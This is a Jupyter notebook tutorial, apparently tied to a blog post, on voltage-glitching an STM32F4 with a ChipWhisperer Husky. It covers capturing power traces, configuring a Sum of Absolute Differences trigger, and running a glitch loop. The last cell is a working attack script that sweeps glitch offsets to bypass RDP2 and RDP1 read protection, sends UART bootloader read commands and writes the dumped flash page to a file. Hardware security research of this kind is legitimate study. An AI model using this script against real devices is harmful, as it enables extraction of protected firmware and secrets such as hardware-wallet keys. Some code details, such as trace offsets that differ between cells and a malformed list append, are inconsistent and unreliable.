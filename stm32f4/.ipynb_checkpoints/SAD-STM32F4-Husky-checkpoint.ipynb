{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "23fa18b6-1788-4221-9224-68c5a5d79d46",
   "metadata": {},
   "source": [
    "# Husky SAD Capure / Triggering Example\n",
    "\n",
    "# Overview\n",
    "\n",
    "The puspose of this notebook is to provide a simple guide to capturing power traces and setting up SAD triggers with the Chipwhisperer Husky. \n",
    "\n",
    "## SAD: Overview\n",
    "\n",
    "One of the many powerful new features on the ChipWhisperer Husky is the ability to trigger on the detection of a particular waveform pattern. This is done via a \"SAD\" trigger, which stands for Sum of Absolute Differences. \n",
    "\n",
    "In order to do this, we must capture a baseline power trace and identify a pattern that we wish to use as a trigger. With the waveform data specific, the ChipWhisperer will then monitor the analog input signal and look for the same pattern, when that pattern is detected, a trigger event will occur.\n",
    "\n",
    "Of course, no two analog data samples are identical, so we can specify a threshold that we want the trigger module to use. \n",
    "\n",
    "The image below from the NEWAE wiki explains this nicely:\n",
    "\n",
    "![NEWAE Wiki](https://wiki.newae.com/images/c/cf/Sad_diagram.png)\n",
    "\n",
    "# Target Overview and Preparation\n",
    "\n",
    "The target that this work will be focusing on is the STM32F4X, see the corresponding blog post for more details.\n",
    "\n",
    "# Capture Baseline Trace\n",
    "\n",
    "The first thing that we need to do is capture our baseline trace that we want to reference for our trigger. Before we do that, we will import some common libraries and define some helper functions for later. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6394f927-eeb0-43ba-a3d9-89efffb919ef",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import chipwhisperer as cw\n",
    "import matplotlib.pyplot as plt\n",
    "import time\n",
    "\n",
    "#scope = cw.scope(scope_type=cw.scopes.OpenADC)\n",
    "#scope.default_setup()\n",
    "\n",
    "def reset_and_trigger():\n",
    "    global scope\n",
    "    scope.io.target_pwr = False\n",
    "    time.sleep(1)\n",
    "    scope.arm()\n",
    "    scope.io.target_pwr = True\n",
    "    scope.capture()\n",
    "    return scope.get_last_trace()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "75825967-f9e8-4a08-ba01-63123e2931e7",
   "metadata": {},
   "source": [
    "## Scope Configuration\n",
    "Next we configure the scope and set up the baseline trace. One thing to remember is that since we are planning on using a SAD trigger, we have to ensure that we area always using the same scope settings. For this first capture, we are going to trigger off of the ```RST``` line on the development board which can be seen in the image below:\n",
    "\n",
    "![TODO](./images/rst.jpg)\n",
    "\n",
    "The scope settings below will eventually be changed when we want to set up our SAD triggeting, but before we do that we need to capture the data that we wish to use as a baseline. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72cfe7eb-2271-4f94-827b-10369e7de7c1",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "scope.adc.basic_mode = \"rising_edge\"\n",
    "scope.gain.gain = 0\n",
    "scope.gain.db = 15.0\n",
    "scope.gain.mode = \"low\"\n",
    "scope.adc.samples = 131124\n",
    "scope.clock.clkgen_freq = 30e6\n",
    "scope.adc.offset = 0\n",
    "scope.clock.adc_mul = 1\n",
    "time.sleep(1)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fab2445e-c17a-4e8d-b714-6e47845da87f",
   "metadata": {},
   "source": [
    "## Baseline Power Capture\n",
    "Now that we have our scope configured, we will capture a power trace of our target signal, in our case this will be the VCAP lines on the STM32F4. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "68e73eaf-d3a4-44a0-8422-664417e3dd45",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "vcap_ref = []\n",
    "vcap_ref.append(reset_and_trigger())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1d9a7dbd-7d57-4a5e-8b67-4717e0d7a194",
   "metadata": {},
   "source": [
    "## Graph the Capture\n",
    "Now that we have captured a power trace in ```vcap_ref```, let's examine the power trace using matplotlib. An example interractive graph can be generated using the cell below. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7799ae1f-5f97-4c69-ae63-3389f377df4a",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "%matplotlib widget\n",
    "import matplotlib.pyplot as plt\n",
    "plt.cla()\n",
    "plt.plot(vcap_ref[-1])\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ce039f41-1662-44b6-8b57-08dfe48b03ef",
   "metadata": {},
   "source": [
    "## Reviewing the Capture\n",
    "\n",
    "Note that in this capture, we have a long period of time where there is almost _no_ activity going on, but right around offset 40000, we see some voltage fluctuations. \n",
    "\n",
    "![STM32F4 Power Trace](./images/base.png)\n",
    "\n",
    "If we zoom in on the graph we see the following interesting shape:\n",
    "\n",
    "![STM32F4 Boot Rom Execution Trace](./images/full_trace.png)\n",
    "\n",
    "This is likely the beginning of the bootrom execution, it even has a similar shape to the waveform that we captured in the [last post]() on the Trezor One:\n",
    "\n",
    "![STM32F4 Boot Rom Execution Trace](./images/bootrom.png)\n",
    "\n",
    "\n",
    "![Trezor Capture](./images/trezor_trace.png)\n",
    "\n",
    "After this sequence, we have one more block of activity before the power trace normalizes and if we zoom in on this even _further_ we can see that there is a slight difference in activity toward the end:\n",
    "\n",
    "![Trezor Capture](./images/flash_check.png)\n",
    "\n",
    "At this point, we have identified a possible location to initially target with our voltage glitching attack. However, we need to idenfity a consistent, reliable trigger. While the reset line will work, it would be great if we could trigger off of the actual power trace data, luckily the ChipWhisperer Husky offers us another option called Sum of Absolute Difference triggering. \n",
    "\n",
    "We will use this waveform as our reference for the SAD triggering, based on the graph execution appears to begin at offset 39850. We can use this downward spike as a reference for our SAD trigger, see the screenshow below for a zoomed in screenshot of the trace. \n",
    "\n",
    "![Trezor Capture](./images/SAD-trigger.png)\n",
    "\n",
    "In the following cell we will set up the reference waveform and configure the Scope to take a test power capture using the SAD trigger. If we set up the various paramters properly, then we should expect to see the same waveform in our capture.\n",
    "\n",
    "## Scope Configuration\n",
    "- ```scope.SAD.reference```: This is the reference waveform that we want the scope to trigger on, this is where we specify the pattern that we want the scope to look for \n",
    "    - [Link to reference in source]()\n",
    "- ```scope.SAD.threshold```: This is the threshold that will be used for the SAD trigger, this is what will be compared against the _difference_ between our captured reace and our reference trace.\n",
    "    - [Link to reference in source](https://chipwhisperer.readthedocs.io/en/latest/scope-api.html#chipwhisperer.capture.scopes.cwhardware.ChipWhispererSAD.ChipWhispererSAD.threshold)\n",
    "- ```scope.adc.presamples```: This is how many samples are captured **before** the trigger event\n",
    "    - [Link to refernece in source](https://chipwhisperer.readthedocs.io/en/latest/scope-api.html#chipwhisperer.capture.scopes._OpenADCInterface.TriggerSettings.presamples)\n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e152842-7664-49e0-a6ae-3d074f75fcb7",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "triggered_captures = []\n",
    "scope.reset_fpga()\n",
    "scope.trigger.module = 'SAD'\n",
    "trace_offset = 3850\n",
    "scope.SAD.reference = test.waves[0][trace_offset:trace_offset+32]\n",
    "scope.SAD.threshold =60\n",
    "scope.adc.presamples = 1000\n",
    "triggered_captures.append(reset_and_trigger())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "13ad097e-dbe1-47a7-a678-5fcbc3e7faa1",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "%matplotlib widget\n",
    "plt.cla()\n",
    "plt.clf()\n",
    "plt.plot(triggered_captures[-1])\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4d55aaa3-8412-4b9a-a7dd-4794c9177ce2",
   "metadata": {},
   "source": [
    "## Side Note: Saving Power Traces and Captures\n",
    "\n",
    "One of the biggest problems with reproducing fault injection work is that results can be difficult to replicate across different hardware configurations. Things such as wire length, shielding can affect the way captures are collected and the resulting shapes of the waveforms. Lucklily for us, the ChipWhisperer has methods to export captured traces and import them. If you want to save your captures to a ChipWhisperer project, here is some example code to do so:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "69809bdb-67ae-480d-9ed4-e1d758a65499",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "# Create and export example project\n",
    "import chipwhisperer as cw\n",
    "proj = cw.create_project(\"traces/stm32f4-trace-example-vcap\")\n",
    "trace = cw.Trace(vcap_ref[0], None, None, None)\n",
    "proj.traces.append(trace)\n",
    "proj.save()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fe1b60dc-5c06-4465-bdbb-a90cbd361c7f",
   "metadata": {},
   "source": [
    "## Side Note: Importing a Capture\n",
    "\n",
    "Or, if you want to import our captures for your own usage and analysis, you can load them using the example code below:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "264b9a0a-7b1b-492f-b6b3-9f15fd84d47b",
   "metadata": {},
   "outputs": [],
   "source": [
    "test = cw.open_project(\"traces/stm32f4-trace-example-vcap\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b780572-794d-4f2a-b14d-880b8a378ca9",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "a0aadc56-8176-44bc-b38d-99a9037ab948",
   "metadata": {},
   "source": [
    "\n",
    "# Oscilloscope Integration\n",
    "\n",
    "So at this point, we have configured the Chipwhisperer to trigger on a specific analog pattern outlined in ```vcap_ref```, next we need to dial in our glitch and test it with the oscilloscope to make sure that we are triggering properly. \n",
    "\n",
    "One of the (many) great new features on the Husky, is the addition of the Trigger/Glitch Out port, this line will assert when a trigger event occurs, allowing to then trigger additional equipment, like an oscilloscope for example! We will connect this to the oscilloscope and capture a basic trigger event and see what happens:\n",
    "\n",
    "![TODO](scope-integration.png)\n",
    "\n",
    "Excellent! We can see that we triggered properly and the VCAP waveform was captured by the oscilloscope, we can use this setup to debug our glitch placement and shape. \n",
    "\n",
    "# Glitch Placement and Shape\n",
    "\n",
    "Similarly to the [last example]() that we provided, we need to make sure that we properly shape our glitch. Since we are doing voltage glitching as opposed to clock glitching we really only need to dial in two things:\n",
    "\n",
    "1. ```scope.glitch.ext_offset```: How long we wait *after* the trigger before we perform the glitch\n",
    "2. ```scope.glitch.repeat```: How many clock cycles we pull down the vcap line\n",
    "\n",
    "We can dial this in using the oscilloscope, we need to make sure that:\n",
    "\n",
    "1. We are triggering and glitching in the right location\n",
    "2. We are not crashing the target every time we glitch it\n",
    "\n",
    "After some testing, we determined that the following values worked well for glitching the target and _not_ crashing it:\n",
    "\n",
    "```scope.glitch.repeat = 4```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "220d4e79-1a5e-47d6-a886-611c01887b2e",
   "metadata": {},
   "source": [
    "# Glitch Loop\n",
    "\n",
    "Now that we have determined all of our paramters for the glitch, it's time to iterate over the range where we suspect the RDP configuration data is being read out in the bootrom. Based on our analysis of the power trace, the following offset ranges seem promising:\n",
    "\n",
    "7700-7800\n",
    "\n",
    "Finally we set up a simple glitch loop, this will iterate over the specificed ext_offset values, and test to see if the UART bootloader is being executed, if enabled we will add the offset to a list for later analysis."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "852b972d-7ccf-492c-9f54-dd5726cfaf34",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "gc_rdp2 = glitch.GlitchController(groups=[\"success\", \"failure\"], parameters=[\"ext_offset\",\"tries\"])\n",
    "gc_rdp1 = glitch.GlitchController(groups=[\"success\", \"failure\"], parameters=[\"ext_offset\",\"tries\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "40822a44-bc19-4725-923c-721a973da9d4",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "gc_rdp2.display_stats()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a26678ff-c1a8-4894-a5b9-50219cd81778",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "gc_rdp1.display_stats()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "424739d4-cadb-441b-aa63-54204bc6b8f8",
   "metadata": {},
   "source": [
    "# Glitch Configuration and Loop\n",
    "\n",
    "Our glitch loop will contain two glitches. One to bypass RDP2 and enter the UART bootloader, and then another that will glitch the memory read command. \n",
    "\n",
    "- `setup_SAD`: This function is used to set up the SAD triggering and references the trace that we examined previously\n",
    "- `set_glitch_one_params`: This function is used to set up the glitch parameters for the SAD trigger, we specify the EXT offset ranges that we want to use after the initial power spike is identified in the trace\n",
    "- `setup_edge_trigger`: This function is responsible for setting up our edge trigger, which is used to perform a glitch after the read memory command has been issued over UART."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e6a042f-4cc5-4326-aad8-7b22e928d640",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "import chipwhisperer.common.results.glitch as glitch\n",
    "import chipwhisperer as cw\n",
    "import serial\n",
    "import time\n",
    "import sys\n",
    "import os\n",
    "import subprocess\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "import serial\n",
    "stm = serial.Serial(\n",
    "            port=\"/dev/ttyUSB0\",\n",
    "            baudrate=9600,\n",
    "            # number of write_data bits\n",
    "            parity=serial.PARITY_EVEN,\n",
    "            timeout=.25\n",
    "        )\n",
    "\n",
    "#scope = cw.scope(scope_type=cw.scopes.OpenADC)\n",
    "scope.default_setup()\n",
    "\n",
    "def serial_check():\n",
    "    stm.write(b'\\x7F')\n",
    "    ret = stm.read(1)\n",
    "    try:\n",
    "        print(ret[0])\n",
    "        if ret[0] == 0x79:\n",
    "            return True\n",
    "    except:\n",
    "        pass\n",
    "    return False\n",
    "\n",
    "def serial_read():\n",
    "    stm.write(b'\\x11\\xEE')\n",
    "    ret = stm.read(1)\n",
    "    try:\n",
    "        if ret[0] == 0x79:\n",
    "            print(f\"Read ACK: {ret}\")\n",
    "            stm.write(b'\\x08\\x00\\x00\\x00\\x08')\n",
    "            time.sleep(.01)\n",
    "            ret = stm.read(1)\n",
    "            if ret[0] != 0x79:\n",
    "                return False,None\n",
    "            print(f\"Address ACK: {ret[0]}\")\n",
    "            stm.write(b'\\xFF\\x00')\n",
    "            time.sleep(.1)\n",
    "            ret = stm.read(0x2000)\n",
    "            print(ret)\n",
    "            return True,ret\n",
    "        else:\n",
    "            return False,None\n",
    "    except:\n",
    "        return False,None\n",
    "    \n",
    "def reboot_flush():            \n",
    "    global scope\n",
    "    scope.io.target_pwr = False\n",
    "    scope.io.nrst = False\n",
    "    time.sleep(1)\n",
    "    scope.io.nrst = \"high_z\"\n",
    "    scope.arm()\n",
    "    scope.io.target_pwr = True\n",
    "    scope.capture()\n",
    "    \n",
    "def soft_reboot(arm):            \n",
    "    global scope\n",
    "    scope.io.nrst = False\n",
    "    time.sleep(1)\n",
    "    scope.io.nrst = \"high_z\"\n",
    "    if arm:\n",
    "        scope.arm()\n",
    "\n",
    "# Modify your trace offset to match your collected trace from the previous example!\n",
    "trace_offset = 42350\n",
    "\n",
    "def setup_SAD():\n",
    "    scope.default_setup()\n",
    "    scope.adc.basic_mode = \"rising_edge\"\n",
    "    scope.gain.gain = 0\n",
    "    scope.gain.db = 15.0\n",
    "    scope.gain.mode = \"low\"\n",
    "    scope.adc.samples = 131124\n",
    "    scope.clock.clkgen_freq = 30e6\n",
    "    scope.adc.offset = 0\n",
    "    scope.clock.adc_mul = 1\n",
    "    scope.trigger.module = 'SAD'\n",
    "    scope.SAD.reference = test.waves[0][trace_offset:trace_offset+32]\n",
    "    scope.SAD.threshold =60\n",
    "    scope.adc.presamples = 1000\n",
    "\n",
    "def set_glitch_one_params():\n",
    "    gc_rdp2.set_global_step(g_step)\n",
    "    # Note: Depending on your trace capture you may need to modify the ext_offset ranges\n",
    "    gc_rdp2.set_range(\"ext_offset\", 7700 , 7800)\n",
    "    gc_rdp2.set_range(\"tries\",1,5)\n",
    "    reboot_flush()\n",
    "    scope.glitch.enabled = True\n",
    "    scope.glitch.clk_src = \"pll\" # set glitch input clock\n",
    "    scope.glitch.output = \"enable_only\" # glitch_out = clk ^ glitch\n",
    "    scope.glitch.trigger_src = \"ext_single\" # glitch only after scope.arm() called\n",
    "    scope.glitch.width = 40\n",
    "    scope.glitch.offset = -45\n",
    "    assert scope.glitch.mmcm_locked\n",
    "\n",
    "def setup_edge_trigger():\n",
    "    scope.reset_fpga()\n",
    "    scope.default_setup()\n",
    "    gc_rdp1.set_range(\"ext_offset\", 50 , 80)\n",
    "    gc_rdp1.set_range(\"tries\",1,5)\n",
    "    scope.adc.basic_mode = \"rising_edge\"\n",
    "    scope.gain.gain = 0\n",
    "    scope.gain.db = 15.0\n",
    "    scope.gain.mode = \"low\"\n",
    "    scope.adc.samples = 131124\n",
    "    scope.clock.clkgen_freq = 30e6\n",
    "    scope.adc.offset = 0\n",
    "    scope.clock.adc_mul = 1\n",
    "    scope.trigger.module = 'edge_counter'\n",
    "    scope.trigger.triggers = \"tio4\"\n",
    "    scope.trigger.edges = 16\n",
    "    scope.io.glitch_trig_mcx = 'trigger'\n",
    "    scope.glitch.enabled = True\n",
    "    scope.glitch.clk_src = \"pll\" # set glitch input clock\n",
    "    scope.glitch.output = \"enable_only\" # glitch_out = clk ^ glitch\n",
    "    scope.glitch.trigger_src = \"ext_single\" # glitch only after scope.arm() called\n",
    "    scope.glitch.width = 40\n",
    "    scope.glitch.offset = -45\n",
    "    assert scope.glitch.mmcm_locked\n",
    "    \n",
    "successes = []\n",
    "\n",
    "def rdp2_bypass():\n",
    "    foo = False\n",
    "    swd_success = []\n",
    "    uart_success = []\n",
    "    boot_bypass = False\n",
    "    setup_SAD()\n",
    "    set_glitch_one_params()\n",
    "    while boot_bypass == False:\n",
    "        for glitch_setting in gc_rdp2.glitch_values():\n",
    "            scope.glitch.ext_offset = glitch_setting[0]\n",
    "            scope.glitch.repeat = 4\n",
    "            # Reboot target, arm scope, wait for glitch\n",
    "            reboot_flush()\n",
    "            # Allow target time to initialize\n",
    "            time.sleep(2)\n",
    "            # Reset glitch lines as reccomended in docs\n",
    "            scope.io.glitch_hp = False\n",
    "            scope.io.glitch_hp = True\n",
    "            scope.io.glitch_lp = False\n",
    "            scope.io.glitch_lp = True\n",
    "            # Check to see if glitch was successful\n",
    "            x = serial_check()\n",
    "            if x:\n",
    "                print(\"Serial bypass success! -- offset = {}, width = {}, ext_offset = {} repeat = {} foo = {}\".format(scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset,scope.glitch.repeat,foo))\n",
    "                uart_success.append(foo,scope.glitch.ext_offset)\n",
    "\n",
    "def rdp1_bypass():\n",
    "    rdp2_bypass()\n",
    "    print(\"First check bypassed!\")\n",
    "    fail_count = 0\n",
    "    for glitch_setting in gc_rdp1.glitch_values():\n",
    "        setup_edge_trigger()\n",
    "        scope.glitch.ext_offset = glitch_setting[0]\n",
    "        scope.glitch.repeat = 4\n",
    "        #\n",
    "        time.sleep(2)\n",
    "        scope.io.glitch_hp = False\n",
    "        scope.io.glitch_hp = True\n",
    "        scope.io.glitch_lp = False\n",
    "        scope.io.glitch_lp = True\n",
    "        x = serial_check()\n",
    "        if x == False:\n",
    "            soft_reboot(True)\n",
    "            fail_count += 1\n",
    "            if fail_count == 5:\n",
    "                # At this point assume we have crashed the STM32 and need to re-enter bootloader mode!\n",
    "                rdp2_bypass()\n",
    "                fail_count = 0\n",
    "        else:\n",
    "            x,flash_dat = serial_read()\n",
    "            if x:\n",
    "                print(\"Flash Read Success! -- offset = {}, width = {}, ext_offset = {}\".format(scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset))\n",
    "                flash_dat = bytes(flash_dat[1:])\n",
    "                with open(\"first_page_glitched.bin\",'wb') as ofile:\n",
    "                    ofile.write(flash_dat)\n",
    "                successes.append(scope.glitch.ext_offset)\n",
    "rdp1_bypass()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  },
  "toc-autonumbering": true
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
